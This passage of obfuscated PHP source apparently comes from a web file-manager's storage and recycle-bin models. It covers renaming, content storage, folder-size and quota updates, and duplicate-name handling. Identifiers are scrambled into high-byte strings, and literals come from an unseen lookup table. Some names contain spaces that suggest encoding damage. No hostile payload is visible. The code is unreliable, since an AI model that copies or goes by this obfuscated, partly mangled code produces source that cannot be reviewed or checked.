$Ó°ñòïı[22], $Ó°ñòïı[403]); $êôØ²Øå[] = $±ƒÄ»÷; } } else { $«ÎğÏ§³ = array($ä‚ÊûƒÎ[$Ó°ñòïı[467]]); $êôØ²Øå = array($±ƒÄ»÷); } return array($Ó°ñòïı[2092] => $êôØ²Øå, $Ó°ñòïı[1453] => $«ÎğÏ§³); } public function removeArray($–úï‡») { if (!$–úï‡») { return !0; } } public function removeRelevance($ùŞ¥…Ÿ£, $›¹Œ§‰Í) { $Ë¥˜×ó‘ =& $_SERVER[¹àö™Ç¾]; $ùŞ¥…Ÿ£ = $ùŞ¥…Ÿ£ ? $ùŞ¥…Ÿ£ : array(); $›¹Œ§‰Í = $›¹Œ§‰Í ? $›¹Œ§‰Í : array(); $ùŞ¥…Ÿ£ = array_unique(array_filter($ùŞ¥…Ÿ£)); $›¹Œ§‰Í = array_unique(array_filter($›¹Œ§‰Í)); if (!$ùŞ¥…Ÿ£) { return !1; } $ï°¦¡¨­ = array($Ë¥˜×ó‘[418] => array($Ë¥˜×ó‘[419], $ùŞ¥…Ÿ£)); Model($Ë¥˜×ó‘[2093])->where($ï°¦¡¨­)->delete(); Model($Ë¥˜×ó‘[461])->where($ï°¦¡¨­)->delete(); Model($Ë¥˜×ó‘[1949])->where($ï°¦¡¨­)->delete(); Model($Ë¥˜×ó‘[564])->where($ï°¦¡¨­)->delete(); Model($Ë¥˜×ó‘[1788])->removeBySource($ùŞ¥…Ÿ£); Model($Ë¥˜×ó‘[2074])->removeBySource($ùŞ¥…Ÿ£); $this->where($ï°¦¡¨­)->delete(); Model($Ë¥˜×ó‘[470])->remove($›¹Œ§‰Í); for ($³‘¬ù÷ = 0; $³‘¬ù÷ < count($ùŞ¥…Ÿ£); $³‘¬ù÷++) { $this->sourceCacheClear($ùŞ¥…Ÿ£[$³‘¬ù÷]); } } public function rename($ã®‘ã‚Š, $±¹ßË§À) { $»˜‡î…Ğ =& $_SERVER[¹àö™Ç¾]; $£ì¤¦Ñ = $this->sourceInfo($ã®‘ã‚Š); if (!$£ì¤¦Ñ) { return !1; } $•½ŠŸ–¿ = $this->fileNameExist($£ì¤¦Ñ[$»˜‡î…Ğ[498]], $±¹ßË§À); if ($•½ŠŸ–¿ && $•½ŠŸ–¿ != $ã®‘ã‚Š) { return !1; } $«»†ŸÜ = array($»˜‡î…Ğ[421] => $±¹ßË§À, $»˜‡î…Ğ[583] => USER_ID); if ($£ì¤¦Ñ[$»˜‡î…Ğ[411]] != $»˜‡î…Ğ[99]) { $«»†ŸÜ[$»˜‡î…Ğ[413]] = substr(get_path_ext($±¹ßË§À), 0, 10); } Model($»˜‡î…Ğ[564])->eventRename($ã®‘ã‚Š, $£ì¤¦Ñ[$»˜‡î…Ğ[42]], $±¹ßË§À); $this->sourceCacheClear($ã®‘ã‚Š); $this->setNamePinyin($ã®‘ã‚Š, $«»†ŸÜ[$»˜‡î…Ğ[42]], !1); $this->updateModifyTime($£ì¤¦Ñ[$»˜‡î…Ğ[498]]); $¿ÈÇ·Ü¯ = $this->where(array($»˜‡î…Ğ[418] => $ã®‘ã‚Š))->data($«»†ŸÜ)->save(); $ñªµ¡ê¢ = $»˜‡î…Ğ[2082] . $£ì¤¦Ñ[$»˜‡î…Ğ[498]]; if (isset(self::$cacheChildList[$ñªµ¡ê¢])) { unset(self::$cacheChildList[$ñªµ¡ê¢]); } return $¿ÈÇ·Ü¯; } public function setNamePinyin($ñİ…¦¿Û, $Ê‡È©Áğ, $ö…œŠùã = true) { $Ü‚»¯÷Ê =& $_SERVER[¹àö™Ç¾]; $‘õÉ›‚Á = Input::check($Ê‡È©Áğ, $Ü‚»¯÷Ê[587]); $åş‰›Şå = array($Ü‚»¯÷Ê[442] => KodSort::makeStr($Ê‡È©Áğ)); if ($‘õÉ›‚Á) { $åş‰›Şå[$Ü‚»¯÷Ê[464]] = str_replace($Ü‚»¯÷Ê[63], $Ü‚»¯÷Ê[22], Pinyin::get($Ê‡È©Áğ)); $åş‰›Şå[$Ü‚»¯÷Ê[463]] = Pinyin::get($Ê‡È©Áğ, $Ü‚»¯÷Ê[588]); } if (!$ö…œŠùã && !$‘õÉ›‚Á) { $åş‰›Şå[$Ü‚»¯÷Ê[464]] = null; $åş‰›Şå[$Ü‚»¯÷Ê[463]] = null; } $this->metaSet($ñİ…¦¿Û, $åş‰›Şå); } public function getContent($Ûå§û×¯) { $œÎşşú  =& $_SERVER[¹àö™Ç¾]; $¾……èì = $this->fileInfoGet($Ûå§û×¯); if (!$¾……èì) { return !1; } if ($¾……èì[$œÎşşú [90]] == 0) { return $œÎşşú [22]; } $«÷ô¬í¾ = $œÎşşú [2096] . $¾……èì[$œÎşşú [179]]; if ($¾……èì[$œÎşşú [90]] <= 1024 * 10) { $âıà’§ü = Cache::get($«÷ô¬í¾); if (!$âıà’§ü) { $âıà’§ü = IO::getContent($¾……èì[$œÎşşú [88]]); Cache::set($«÷ô¬í¾, $âıà’§ü); } return $âıà’§ü; } if (!$¾……èì[$œÎşşú [88]]) { return $œÎşşú [22]; } return IO::getContent($¾……èì[$œÎşşú [88]]); } public function setDesc($•Ô‰‚ÕØ, $‰„·ÂœŸ) { $ŸŞëİ¬Û =& $_SERVER[¹àö™Ç¾]; Model($ŸŞëİ¬Û[564])->eventAddDesc($•Ô‰‚ÕØ, $‰„·ÂœŸ); return $this->metaSet($•Ô‰‚ÕØ, $ŸŞëİ¬Û[451], $‰„·ÂœŸ); } public function setContent($ÛŞ¥à€ğ, $ÜıÁ‹ÑŞ = '') { $¥şÏšê =& $_SERVER[¹àö™Ç¾]; $ÜÏÚ±ò = $this->sourceInfo($ÛŞ¥à€ğ); $Ğ‘àÙÜ¹ = $this->fileInfoGet($ÛŞ¥à€ğ); if (!$Ğ‘àÙÜ¹ || !$ÜÏÚ±ò) { return !1; } $®¸˜âÄŞ = Model($¥şÏšê[470])->addFileByContent($ÜıÁ‹ÑŞ, $ÜÏÚ±ò[$¥şÏšê[42]]); $”Û¬Ä»š = $this->fileHistory($ÜÏÚ±ò, $®¸˜âÄŞ[$¥şÏšê[467]], $®¸˜âÄŞ[$¥şÏšê[90]]); if (!$”Û¬Ä»š) { return Model($¥şÏšê[470])->remove($®¸˜âÄŞ[$¥şÏšê[467]]); } $this->folderSizeReset($ÜÏÚ±ò[$¥şÏšê[498]]); return !0; } public function fileSubstr($““‹½¨æ, $Àğ—ñÚ€, $î™ÍÕø€) { $¦ˆùÌÚ = $this->fileInfoGet($““‹½¨æ); if (!$¦ˆùÌÚ) { return !1; } return IO::fileSubstr($¦ˆùÌÚ[$_SERVER[¹àö™Ç¾][88]], $Àğ—ñÚ€, $î™ÍÕø€); } public function fileInfoGet($·•ñæ»°) { $ñûåë©ë =& $_SERVER[¹àö™Ç¾]; $šÖË¥„Â = $this->sourceInfo($·•ñæ»°); if (!$šÖË¥„Â || $šÖË¥„Â[$ñûåë©ë[411]]) { return !1; } $ƒÑóÈ«˜ = $ñûåë©ë[473] . $šÖË¥„Â[$ñûåë©ë[467]]; $Ş¸Ÿ„ëŞ = _get(self::$cacheFileInfo, $ƒÑóÈ«˜); if ($Ş¸Ÿ„ëŞ) { return $Ş¸Ÿ„ëŞ; } $“‰¸ĞôÍ = Model($ñûåë©ë[470])->fileInfo($šÖË¥„Â[$ñûåë©ë[467]]); if ($“‰¸ĞôÍ) { $“‰¸ĞôÍ[$ñûåë©ë[42]] = $šÖË¥„Â[$ñûåë©ë[42]]; } self::$cacheFileInfo[$ƒÑóÈ«˜] = $“‰¸ĞôÍ; return $“‰¸ĞôÍ; } private function folderChildrenNumber($©Á€Ç®ï) { $ûû”“ìÚ =& $_SERVER[¹àö™Ç¾]; $˜ºı›üü = $this->sourceInfo($©Á€Ç®ï); $‡§ç•ÒÑ = array($ûû”“ìÚ[584] => array($ûû”“ìÚ[544], $˜ºı›üü[$ûû”“ìÚ[521]] . $©Á€Ç®ï . $ûû”“ìÚ[545]), $ûû”“ìÚ[581] => $˜ºı›üü[$ûû”“ìÚ[504]], $ûû”“ìÚ[430] => intval($˜ºı›üü[$ûû”“ìÚ[431]]), $ûû”“ìÚ[577] => 1); $Ÿº‰ª­Ê = $this->where($‡§ç•ÒÑ)->count(); $²‰Ù¸ªÒ = $this->where($‡§ç•ÒÑ)->where(array($ûû”“ìÚ[577] => 0))->count(); return array($ûû”“ìÚ[94] => $²‰Ù¸ªÒ, $ûû”“ìÚ[95] => $Ÿº‰ª­Ê); } public function pathInfo($£ÒÄ…, $¼²É‡øÃ = false) { $˜‡š…½ =& $_SERVER[¹àö™Ç¾]; $¼²É‡øÃ = !1; $£ÒÄ… = intval($£ÒÄ…); $å€µù· = $˜‡š…½[459] . intval($¼²É‡øÃ) . $˜‡š…½[460] . $£ÒÄ…; $âÉ§¼‚â = _get(self::$cachePathInfo, $å€µù·); if ($âÉ§¼‚â) { return $âÉ§¼‚â; } $Ò¹©’Úã = $this->sourceInfo($£ÒÄ…); if (!$Ò¹©’Úã) { return !1; } $Ò¹©’Úã = $this->_listDataApplyItem($Ò¹©’Úã, $¼²É‡øÃ); self::$cachePathInfo[$å€µù·] = $Ò¹©’Úã; return $Ò¹©’Úã; } public static $cachePathInfoMore = array(); public function pathInfoMore($ªğ“±µ) { $–„ğ®À =& $_SERVER[¹àö™Ç¾]; $Îà¢Ãğ§ = _get(self::$cachePathInfoMore, $ªğ“±µ); if ($Îà¢Ãğ§) { return $Îà¢Ãğ§; } $«áºÓÄÌ = $this->pathInfo($ªğ“±µ); if (!$«áºÓÄÌ) { return !1; } if ($«áºÓÄÌ[$–„ğ®À[411]] == $–„ğ®À[99]) { $«áºÓÄÌ[$–„ğ®À[93]] = $this->folderChildrenNumber($ªğ“±µ); } self::$cachePathInfoMore[$ªğ“±µ] = $«áºÓÄÌ; return $«áºÓÄÌ; } public function sourceInfo($Ø±âŒç¢) { $‹à¤‡Ç™ =& $_SERVER[¹àö™Ç¾]; if (!$Ø±âŒç¢) { return array(); } $Ø±âŒç¢ = intval($Ø±âŒç¢); $÷«Şë‰é = $‹à¤‡Ç™[458] . $Ø±âŒç¢; $‰­Ú™‘À = _get(self::$cacheSourceInfo, $÷«Şë‰é); if ($‰­Ú™‘À) { return $‰­Ú™‘À; } $¬ƒ‘‹ö = $this->where(array($‹à¤‡Ç™[403] => $Ø±âŒç¢))->find(); self::$cacheSourceInfo[$÷«Şë‰é] = $¬ƒ‘‹ö; return self::$cacheSourceInfo[$÷«Şë‰é]; } public function sourceCacheClear($şˆ­œãñ = false) { self::cacheClear($şˆ­œãñ); } public static function cacheClear($ÒİÏã‹ = false) { $º§ÄÛÚî =& $_SERVER[¹àö™Ç¾]; if ($ÒİÏã‹ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$º§ÄÛÚî[458] . $ÒİÏã‹]); unset(self::$cachePathInfoMore[$ÒİÏã‹]); unset(self::$cachePathInfo[$º§ÄÛÚî[2097] . $ÒİÏã‹]); unset(self::$cachePathInfo[$º§ÄÛÚî[2098] . $ÒİÏã‹]); } public function metaSet($í‘ îÓí, $ÍÇÇ½ß‹ = null, $Ë×úÜÖ = null) { $Á„©†¥ª = parent::metaSet($í‘ îÓí, $ÍÇÇ½ß‹, $Ë×úÜÖ); if ($Á„©†¥ª) { $this->sourceCacheClear($í‘ îÓí); } return $Á„©†¥ª; } public function pathInfoByPath($ÂÁ¹‰µ, $’ÏÚªóé) { $Ì×„›Ê® =& $_SERVER[¹àö™Ç¾]; $ËÑÔû¬ = !$’ÏÚªóé ? array() : explode($Ì×„›Ê®[18], trim($’ÏÚªóé, $Ì×„›Ê®[18])); $Ü•Æİ¸“ = $ÂÁ¹‰µ; foreach ($ËÑÔû¬ as $ØØ„Í¹Œ) { $è´¯‹àµ = array($Ì×„›Ê®[498] => $Ü•Æİ¸“, $Ì×„›Ê®[42] => $ØØ„Í¹Œ); $£Ä²¾¿„ = $this->where($è´¯‹àµ)->select(); if (!$£Ä²¾¿„) { return !1; } $£Ä²¾¿„ = array_sort_by($£Ä²¾¿„, $Ì×„›Ê®[431]); $Ü•Æİ¸“ = $£Ä²¾¿„[0][$Ì×„›Ê®[403]]; } return $this->pathInfo($Ü•Æİ¸“, !0); } protected function updateModifyTime($è¼İæ•) { $‰§ıõ¾¼ =& $_SERVER[¹àö™Ç¾]; $ö„††ñ = defined($‰§ıõ¾¼[474]) ? USER_ID : $‰§ıõ¾¼[200]; if (!$è¼İæ•) { return; } if (!is_array($è¼İæ•)) { $è¼İæ• = array($è¼İæ•); } foreach ($è¼İæ• as $üìÒ©…Ã => $ÌÏÆ˜üĞ) { $è¼İæ•[$üìÒ©…Ã] = intval($ÌÏÆ˜üĞ); $this->sourceCacheClear($ÌÏÆ˜üĞ); } $Î˜“ş§ = array($‰§ıõ¾¼[403] => array($‰§ıõ¾¼[17], $è¼İæ•)); $ªù©Õ¦ = array($‰§ıõ¾¼[583] => $ö„††ñ, $‰§ıõ¾¼[425] => time()); $this->where($Î˜“ş§)->save($ªù©Õ¦); } public function folderSizeReset($Ó¶£–šæ, $ÈÅ›İÜ¼ = false) { $ ıÒºï‹ =& $_SERVER[¹àö™Ç¾]; if ($this->statusIgnoreResetSpace) { return; } $¢®¿¾¡Ë = $this->sourceInfo($Ó¶£–šæ); $•˜úç = $ ıÒºï‹[2099] . $Ó¶£–šæ; CacheLock::lock($•˜úç, 20); if ($ÈÅ›İÜ¼ === !1) { $this->sourceCacheClear($Ó¶£–šæ); $¢®¿¾¡Ë = $this->sourceInfo($Ó¶£–šæ); $‘¼Ÿ‚‘Ù = array($ ıÒºï‹[402] => $Ó¶£–šæ, $ ıÒºï‹[430] => 0); $æèïÛ•± = $this->where($‘¼Ÿ‚‘Ù)->sum($ ıÒºï‹[90]); $ÈÅ›İÜ¼ = intval($æèïÛ•±) - intval($¢®¿¾¡Ë[$ ıÒºï‹[90]]); } if ($ÈÅ›İÜ¼ == 0) { return CacheLock::unlock($•˜úç); } $†¡·ğèÒ = $this->parentLevelArray($¢®¿¾¡Ë[$ ıÒºï‹[521]]); if (!$†¡·ğèÒ) { $†¡·ğèÒ = array(); } $†¡·ğèÒ[] = $¢®¿¾¡Ë[$ ıÒºï‹[403]]; $‘¼Ÿ‚‘Ù = array($ ıÒºï‹[403] => array($ ıÒºï‹[419], $†¡·ğèÒ)); if ($ÈÅ›İÜ¼ < 0) { $‘¼Ÿ‚‘Ù[$ ıÒºï‹[90]] = array($ ıÒºï‹[1000], abs($ÈÅ›İÜ¼)); } $this->where($‘¼Ÿ‚‘Ù)->setAdd($ ıÒºï‹[90], $ÈÅ›İÜ¼); CacheLock::unlock($•˜úç); $ë“½‡­ = $ ıÒºï‹[2100] . $¢®¿¾¡Ë[$ ıÒºï‹[412]] . $ ıÒºï‹[4] . $¢®¿¾¡Ë[$ ıÒºï‹[504]]; $İôåóµ¨ = array($¢®¿¾¡Ë[$ ıÒºï‹[412]], $¢®¿¾¡Ë[$ ıÒºï‹[504]]); TaskRun::timeLimitCall($ë“½‡­, $ ıÒºï‹[2101], $İôåóµ¨, 1.5); } public function folderSizeResetChildren($¯´«üã¹) { $éµ”‘Î¯ =& $_SERVER[¹àö™Ç¾]; $this->sourceCacheClear($¯´«üã¹); $Êìšî‰µ = $this->sourceInfo($¯´«üã¹); $­÷Îœ‚ = array($éµ”‘Î¯[577] => 1, $éµ”‘Î¯[581] => $Êìšî‰µ[$éµ”‘Î¯[504]], $éµ”‘Î¯[584] => array($éµ”‘Î¯[544], $Êìšî‰µ[$éµ”‘Î¯[521]] . $¯´«üã¹ . $éµ”‘Î¯[545])); $Ú°µşÔ˜ = $éµ”‘Î¯[2102]; $˜¶áØ•Ö = $this->field($Ú°µşÔ˜)->where($­÷Îœ‚)->select(); $­÷Îœ‚[$éµ”‘Î¯[411]] = 0; $Î–¬«ñ = $this->field($Ú°µşÔ˜)->where($­÷Îœ‚)->select(); if (!$Î–¬«ñ) { return; } $˜¶áØ•Ö[] = $Êìšî‰µ; $˜¶áØ•Ö = array_to_keyvalue($˜¶áØ•Ö, $éµ”‘Î¯[403]); foreach ($˜¶áØ•Ö as $Š£Ö¤º => $ï­ñİßı) { $˜¶áØ•Ö[$Š£Ö¤º][$éµ”‘Î¯[2103]] = $˜¶áØ•Ö[$Š£Ö¤º][$éµ”‘Î¯[90]]; $˜¶áØ•Ö[$Š£Ö¤º][$éµ”‘Î¯[90]] = 0; } foreach ($Î–¬«ñ as $ï­ñİßı) { $€ó§Üà = $ï­ñİßı[$éµ”‘Î¯[498]] . $éµ”‘Î¯[22]; if (!isset($˜¶áØ•Ö[$€ó§Üà])) { continue; } if ($ï­ñİßı[$éµ”‘Î¯[431]] == $˜¶áØ•Ö[$€ó§Üà][$éµ”‘Î¯[431]]) { $˜¶áØ•Ö[$€ó§Üà][$éµ”‘Î¯[90]] += $ï­ñİßı[$éµ”‘Î¯[90]]; } } foreach ($˜¶áØ•Ö as $ï­ñİßı) { $Ëğó­ƒ = $this->parentLevelArray($ï­ñİßı[$éµ”‘Î¯[521]]); foreach ($Ëğó­ƒ as $€ó§Üà) { $€ó§Üà = $€ó§Üà . $éµ”‘Î¯[22]; if (!isset($˜¶áØ•Ö[$€ó§Üà])) { continue; } if ($ï­ñİßı[$éµ”‘Î¯[431]] == $˜¶áØ•Ö[$€ó§Üà][$éµ”‘Î¯[431]]) { $˜¶áØ•Ö[$€ó§Üà][$éµ”‘Î¯[90]] += $ï­ñİßı[$éµ”‘Î¯[90]]; } } } $ÜĞ‹Ø»“ = array(); foreach ($˜¶áØ•Ö as $ï­ñİßı) { if ($ï­ñİßı[$éµ”‘Î¯[90]] == $ï­ñİßı[$éµ”‘Î¯[2103]]) { continue; } $ÜĞ‹Ø»“[] = array($éµ”‘Î¯[403], $ï­ñİßı[$éµ”‘Î¯[403]], $éµ”‘Î¯[90], $ï­ñİßı[$éµ”‘Î¯[90]]); } $this->saveAll($ÜĞ‹Ø»“); } public function userSpaceReset($ÊØ€Ø¾¹ = false) { $…¤è¨ÆÓ =& $_SERVER[¹àö™Ç¾]; $õÏãææ = $this->where(array($…¤è¨ÆÓ[412] => self::TYPE_USER, $…¤è¨ÆÓ[504] => $ÊØ€Ø¾¹, $…¤è¨ÆÓ[411] => 0))->sum($…¤è¨ÆÓ[90]); $õÏãææ = !$õÏãææ || $õÏãææ <= 0 ? 0 : $õÏãææ; Model($…¤è¨ÆÓ[513])->userEdit($ÊØ€Ø¾¹, array($…¤è¨ÆÓ[1797] => $õÏãææ)); } public function targetSpaceUpdate($Ü«Ì¤÷, $°¿¨‘å) { $¤ìâßşÓ =& $_SERVER[¹àö™Ç¾]; if (!$°¿¨‘å) { return; } if (!in_array($Ü«Ì¤÷, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $—ıÉĞ÷ = $this->targetSpaceSize($Ü«Ì¤÷, $°¿¨‘å); if ($Ü«Ì¤÷ == self::TYPE_USER) { Model($¤ìâßşÓ[513])->userEdit($°¿¨‘å, array($¤ìâßşÓ[1797] => $—ıÉĞ÷)); } else { if ($Ü«Ì¤÷ == self::TYPE_GROUP) { Model($¤ìâßşÓ[522])->groupEdit($°¿¨‘å, array($¤ìâßşÓ[1797] => $—ıÉĞ÷)); } } } public function targetSpaceSize($»‡³Ş¾ß, $Â·íÒà¢) { $àÉë©î÷ =& $_SERVER[¹àö™Ç¾]; $ôÈü¼šş = $this->sourceRoot($»‡³Ş¾ß, $Â·íÒà¢, !0); if (!$ôÈü¼šş) { return 0; } $©˜Ÿ¦“´ = floatval($ôÈü¼šş[$àÉë©î÷[90]]); $ü¼„¨ü° = array($àÉë©î÷[584] => array($àÉë©î÷[544], $àÉë©î÷[531] . $ôÈü¼šş[$àÉë©î÷[403]] . $àÉë©î÷[545])); $óû–ÇªÏ = Model($àÉë©î÷[429])->field($àÉë©î÷[418])->where($ü¼„¨ü°)->select(); $óû–ÇªÏ = array_to_keyvalue($óû–ÇªÏ, $àÉë©î÷[22], $àÉë©î÷[403]); $óû–ÇªÏ = array_unique(array_filter($óû–ÇªÏ)); if ($óû–ÇªÏ) { $ü¼„¨ü° = array($àÉë©î÷[418] => array($àÉë©î÷[419], $óû–ÇªÏ)); $©˜Ÿ¦“´ += floatval($this->where($ü¼„¨ü°)->sum($àÉë©î÷[90])); } $©˜Ÿ¦“´ = !$©˜Ÿ¦“´ || $©˜Ÿ¦“´ <= 0 ? 0 : $©˜Ÿ¦“´; return $©˜Ÿ¦“´; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($…’’Ó¢Ê) { return $this->fileTypeProfile($…’’Ó¢Ê, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ë¡ˆôŠÀ) { return $this->fileTypeProfile($ë¡ˆôŠÀ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($†ÁÂ¦©¿, $¡óêé©) { $‚¨‰‹ğî =& $_SERVER[¹àö™Ç¾]; $ç¬½êğâ = $‚¨‰‹ğî[2104] . $†ÁÂ¦©¿ . $‚¨‰‹ğî[21] . $¡óêé©; $Û°§‰°Ó = Cache::get($ç¬½êğâ); if ($Û°§‰°Ó) { return $Û°§‰°Ó; } $§Ş¾¼ƒŸ = array($‚¨‰‹ğî[577] => 0); if ($†ÁÂ¦©¿ != !1) { $§Ş¾¼ƒŸ[$‚¨‰‹ğî[504]] = $†ÁÂ¦©¿; $§Ş¾¼ƒŸ[$‚¨‰‹ğî[412]] = $¡óêé©; } $âŸãåÌë = array(); $âŸãåÌë[$‚¨‰‹ğî[2105]] = array($‚¨‰‹ğî[2106] => LNG($‚¨‰‹ğî[2105]), $‚¨‰‹ğî[2107] => $this->where($§Ş¾¼ƒŸ)->count(), $‚¨‰‹ğî[579] => $this->where($§Ş¾¼ƒŸ)->sum($‚¨‰‹ğî[90])); $¨…Á•´Ó = KodIO::fileTypeList(); foreach ($¨…Á•´Ó as $‚†Ÿ›´ => $œÔ®ºİà) { $§Ş¾¼ƒŸ[$‚¨‰‹ğî[413]] = $this->fileTypeWhere($‚†Ÿ›´); $âŸãåÌë[$‚†Ÿ›´] = array($‚¨‰‹ğî[2106] => $œÔ®ºİà[$‚¨‰‹ğî[42]], $‚¨‰‹ğî[2107] => $this->where($§Ş¾¼ƒŸ)->count(), $‚¨‰‹ğî[579] => $this->where($§Ş¾¼ƒŸ)->sum($‚¨‰‹ğî[90])); } Cache::set($ç¬½êğâ, $âŸãåÌë, 1200); return $âŸãåÌë; } public function fileNameExist($…†úÂ€³, $Ôñ¿¾É) { $‰Âİ¨‹é =& $_SERVER[¹àö™Ç¾]; $ÈËŞº»‡ = $this->where(array($‰Âİ¨‹é[498] => $…†úÂ€³, $‰Âİ¨‹é[42] => $Ôñ¿¾É, $‰Âİ¨‹é[431] => 0))->find(); return is_array($ÈËŞº»‡) ? $ÈËŞº»‡[$‰Âİ¨‹é[403]] : !1; } public function childList($‡û‘ÇÖ©) { $Û¬½â¡Ö =& $_SERVER[¹àö™Ç¾]; $ó½¢ßÁô = $Û¬½â¡Ö[2082] . $‡û‘ÇÖ©; if (isset(self::$cacheChildList[$ó½¢ßÁô])) { return self::$cacheChildList[$ó½¢ßÁô]; } $ïõÒ¹Ê = array($Û¬½â¡Ö[498] => intval($‡û‘ÇÖ©), $Û¬½â¡Ö[431] => 0); $‡Ó‰©œâ = $this->where($ïõÒ¹Ê)->select(); $‡Ó‰©œâ = $‡Ó‰©œâ ? $‡Ó‰©œâ : array(); self::$cacheChildList[$ó½¢ßÁô] = $‡Ó‰©œâ; foreach ($‡Ó‰©œâ as $ô®Å ±¿) { $ó½¢ßÁô = $Û¬½â¡Ö[458] . $ô®Å ±¿[$Û¬½â¡Ö[403]]; self::$cacheSourceInfo[$ó½¢ßÁô] = $ô®Å ±¿; } return $‡Ó‰©œâ; } public function fileNameAuto($€°˜Ø‰, $ˆ£ú‚, $ŞÕœÆù = REPEAT_RENAME, $õãÊ£Ùü = false) { $£Û›÷é› =& $_SERVER[¹àö™Ç¾]; $œÙ¥Ü† = array($£Û›÷é›[498] => $€°˜Ø‰, $£Û›÷é›[431] => 0, $£Û›÷é›[42] => array($£Û›÷é›[387], $ˆ£ú‚ . $£Û›÷é›[388])); $í‚ÁĞ÷û = $this->field($£Û›÷é›[42])->where($œÙ¥Ü†)->select(); $àï›†Êó = array_to_keyvalue($í‚ÁĞ÷û, $£Û›÷é›[22], $£Û›÷é›[42]); return $this->fileNameAutoGet($àï›†Êó, $ˆ£ú‚, $ŞÕœÆù, $õãÊ£Ùü); } public function fileNameAutoGet($±†Ÿøù§, $‘ÃÁ¹˜, $“ŒıÖäø, $ÍÚŠãÇŸ) { $Æ“­ˆˆ© =& $_SERVER[¹àö™Ç¾]; if ($“ŒıÖäø == REPEAT_REPLACE || !$±†Ÿøù§ || !in_array_not_case($‘ÃÁ¹˜, $±†Ÿøù§) || $ÍÚŠãÇŸ && $“ŒıÖäø != REPEAT_RENAME_FOLDER) { return $‘ÃÁ¹˜; } if ($“ŒıÖäø == REPEAT_SKIP) { return !1; } $¨ÆàŞŸ› = $Æ“­ˆˆ©[20] . get_path_ext($‘ÃÁ¹˜); $¨ÆàŞŸ› = $¨ÆàŞŸ› == $Æ“­ˆˆ©[20] || $ÍÚŠãÇŸ ? $Æ“­ˆˆ©[22] : $¨ÆàŞŸ›; for ($‘ÂÂ¥âË = 1; $‘ÂÂ¥âË <= count($±†Ÿøù§) + 1; $‘ÂÂ¥âË++) { $•œ•çë² = substr($‘ÃÁ¹˜, 0, strlen($‘ÃÁ¹˜) - strlen($¨ÆàŞŸ›)); $Ø–€‚‘¤ = $•œ•çë² . "\x28{$‘ÂÂ¥âË}\x29{$¨ÆàŞŸ›}"; if (!in_array_not_case($Ø–€‚‘¤, $±†Ÿøù§)) { return $Ø–€‚‘¤; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\x72\x63\145\x5f\x72\x65\x63\x79\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\x54\151\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\x74", "\146\165\156\x63\164\x69\157\156")); public function listData($ÌêŸº¤Ø = false) { $Ò‡­ò˜Ş =& $_SERVER[¹àö™Ç¾]; $ÌêŸº¤Ø = $ÌêŸº¤Ø ? $ÌêŸº¤Ø : USER_ID; $ÓØ±æÇ¢ = $this->where(array($Ò‡­ò˜Ş[1631] => $ÌêŸº¤Ø))->select(); return array_to_keyvalue($ÓØ±æÇ¢, $Ò‡­ò˜Ş[22], $Ò‡­ò˜Ş[403]); } public function moveToRecycle($™çãá‡Ë) { $ˆ–·şÉ™ =& $_SERVER[¹àö™Ç¾]; $³­ùÚò« = Model($ˆ–·şÉ™[1310]); $÷îı‡è = $³­ùÚò«->sourceInfo($™çãá‡Ë); if (!$÷îı‡è || $÷îı‡è[$ˆ–·şÉ™[431]] == $ˆ–·şÉ™[99]) { return; } $íŒïû¯ = array($ˆ–·şÉ™[418] => $™çãá‡Ë, $ˆ–·şÉ™[1631] => USER_ID, $ˆ–·şÉ™[580] => $÷îı‡è[$ˆ–·şÉ™[412]], $ˆ–·şÉ™[581] => $÷îı‡è[$ˆ–·şÉ™[504]], $ˆ–·şÉ™[584] => $÷îı‡è[$ˆ–·şÉ™[521]]); $this->add($íŒïû¯); $this->recycleMove($™çãá‡Ë, 1); if ($÷îı‡è[$ˆ–·şÉ™[411]] == $ˆ–·şÉ™[99]) { $Ø—ŞĞ…‹ = array($ˆ–·şÉ™[584] => array($ˆ–·şÉ™[544], $÷îı‡è[$ˆ–·şÉ™[521]] . $™çãá‡Ë . $ˆ–·şÉ™[545])); $³­ùÚò«->where($Ø—ŞĞ…‹)->setField($ˆ–·şÉ™[431], 1); } } public function clear() { $this->remove(!1); } public function remove($şËü²ª« = false, $ƒçêıÚ = false) { $ËÎ¿Šøí =& $_SERVER[¹àö™Ç¾]; $ƒçêıÚ = $ƒçêıÚ ? $ƒçêıÚ : USER_ID; $Ç“üæ¹‰ = Model($ËÎ¿Šøí[1310]); $Í·€Ò²‡ = $this->listData($ƒçêıÚ); $şËü²ª« = $şËü²ª« === !1 ? !1 : $şËü²ª«; $âÕÎàÌ = array(); foreach ($Í·€Ò²‡ as $‚ÏøŸ´Œ) { if ($şËü²ª« != !1 && !in_array($‚ÏøŸ´Œ, $şËü²ª«)) { continue; } $×® †öò = $Ç“üæ¹‰->sourceInfo($‚ÏøŸ´Œ); $Ç“üæ¹‰->remove($‚ÏøŸ´Œ, !1); $ÕĞ¿éø˜ = $×® †öò[$ËÎ¿Šøí[412]] . $ËÎ¿Šøí[21] . $×® †öò[$ËÎ¿Šøí[504]]; $âÕÎàÌ[$ÕĞ¿éø˜] = array($ËÎ¿Šøí[580] => $×® †öò[$ËÎ¿Šøí[412]], $ËÎ¿Šøí[504] => $×® †öò[$ËÎ¿Šøí[504]]); $this->where(array($ËÎ¿Šøí[403] => $‚ÏøŸ´Œ))->delete(); } foreach ($âÕÎàÌ as $¼ˆÁåè¥) { $Ç“üæ¹‰->targetSpaceUpdate($¼ˆÁåè¥[$ËÎ¿Šøí[412]], $¼ˆÁåè¥[$ËÎ¿Šøí[504]]); } } public function restore($ÍáÀäùö = false) { $³èİÕ³ = $this->listData(); $this->_restoreSource($³èİÕ³, $ÍáÀäùö); } public function removeUserAll($ûÑïæ) { $this->remove(!1, $ûÑïæ); } private function _restoreSource($Èİù‡, $Û­ƒ¥áë) { $’‚í¨“€ =& $_SERVER[¹àö™Ç¾]; $ôœì†ğÊ = 